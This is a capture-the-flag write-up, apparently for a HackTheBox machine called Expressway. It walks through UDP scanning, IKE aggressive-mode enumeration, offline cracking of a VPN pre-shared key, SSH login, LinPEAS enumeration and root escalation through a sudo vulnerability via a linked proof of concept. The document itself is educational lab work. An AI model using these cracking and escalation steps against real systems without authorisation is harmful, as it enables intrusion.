---
layout: post
title: "Expressway"
date: 2025-09-24 01:00:00 -0400
author: Hugo Beaulieu
categories: linux machine
tags: linux vpn ike ipsec cve-2025-32463
---

## Overview

Expressway is a Linux machine that requires identifying a VPN service through UDP scanning, cracking an IKE pre-shared key, and exploiting a custom sudo binary vulnerability. The machine highlights the importance of comprehensive port scanning and researching vulnerabilities in non-standard binaries.

## Initial Enumeration

### TCP Scan

We start with a standard TCP scan using nmap, but surprisingly, it reveals no open ports:

```bash
nmap -sT --top-ports 1000 -A -T4 -v -oN nmap_tcp.txt expressway.htb
```

This is unusual and suggests that services might be running on UDP instead.

### UDP Scan

We pivot to a UDP scan to check for services that might be missed by TCP scanning:

```bash
nmap -sU --top-ports 100 -v -oN 06h25_[2025-09-24]_expressway.htb_nmap.txt expressway.htb
```

The UDP scan reveals several interesting ports:

```
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
138/udp   open|filtered netbios-dgm
177/udp   open|filtered xdmcp
443/udp   open|filtered https
500/udp   open          isakmp
998/udp   open|filtered puparp
1029/udp  open|filtered solid-mux
2048/udp  open|filtered dls-monitor
2049/udp  open|filtered nfs
4500/udp  open|filtered nat-t-ike
5632/udp  open|filtered pcanywherestat
32769/udp open|filtered filenet-rpc
49152/udp open|filtered unknown
49154/udp open|filtered unknown
49185/udp open|filtered unknown
```

The most interesting discovery is port `500/udp` running **ISAKMP**, which indicates the presence of an IPsec VPN service.

## VPN Exploitation

### IKE Aggressive Mode Enumeration

Port 500 running ISAKMP suggests a VPN service. We can use `ike-scan` to probe for vulnerabilities and extract information:

```bash
ike-scan -A expressway.htb
```

The aggressive mode handshake returns valuable information:

```
10.100.100.100  Aggressive Mode Handshake returned
HDR=(CKY-R=9805bdde1e964264)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
KeyExchange(128 bytes)
Nonce(32 bytes)
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
Hash(20 bytes)
```

Key findings:

- **Username**: `ike@expressway.htb`
- **Authentication**: Pre-Shared Key (PSK)
- The hash can be cracked offline

### Cracking the Pre-Shared Key

We can use `psk-crack` to crack the PSK using a wordlist:

```bash
psk-crack -d rockyou.txt psk.txt
```

The tool successfully cracks the key:

```
key "[REDACTED]" matches SHA1 hash [REDACTED-SHA1-HASH]
```

Credentials obtained:

- **Username**: `ike`
- **Password**: `[REDACTED]`

## Initial Access

### SSH Connection

With the VPN credentials in hand, we attempt SSH access:

```bash
ssh ike@expressway.htb
```

Success! We gain access to the system and can retrieve the user flag.

## Privilege Escalation Enumeration

### Running LinPEAS

We run LinPEAS to enumerate potential privilege escalation vectors:

```bash
./linpeas.sh
```

LinPEAS reveals several interesting findings:

#### 1. TFTP Service

```
root        3817  0.0  0.0   2900   640 ?        Ss   10:57   0:00 /usr/sbin/in.tftpd --listen --user tftp --address :69 --secure /srv/tftp
```

This TFTP service was also visible in our initial nmap scan on port 69.

#### 2. TFTP Directory Contents

Listing the TFTP directory reveals a configuration file:

```bash
ls /srv/tftp/
ciscortr.cfg
```

This could contain useful configuration information.

#### 3. Group Membership

The user `ike` is a member of the `proxy` group:

```
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

#### 4. Custom Sudo Binary

Most importantly, LinPEAS identifies a custom sudo binary with SUID permissions:

```
-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo
```

This is not the standard sudo binary location and warrants further investigation.

### Checking Sudo Version

We check the version of the custom sudo binary:

```bash
/usr/local/bin/sudo -V
```

## CVE-2025-32463 Exploitation

After researching the sudo version, we discover it's vulnerable to **CVE-2025-32463**. We find a proof-of-concept exploit on GitHub:

```
https://github.com/kh4sh3i/CVE-2025-32463/tree/main
```

This vulnerability allows privilege escalation through the custom sudo implementation. By exploiting this CVE, we can escalate our privileges to root and retrieve the root flag.

The exact exploitation method depends on the specific vulnerability in the sudo binary, but the GitHub repository provides the necessary exploit code and instructions.

## Key Takeaways

- **UDP scanning is critical**: Many services run exclusively on UDP and will be missed by TCP-only scans
- **IKE/IPsec aggressive mode** can leak usernames and allow offline PSK cracking
- **ike-scan** is an effective tool for enumerating VPN services
- **Custom binaries** in non-standard locations should always be investigated for vulnerabilities
- **Version identification** is crucial for finding CVEs and exploits
- **LinPEAS** is invaluable for identifying unusual SUID binaries and misconfigurations
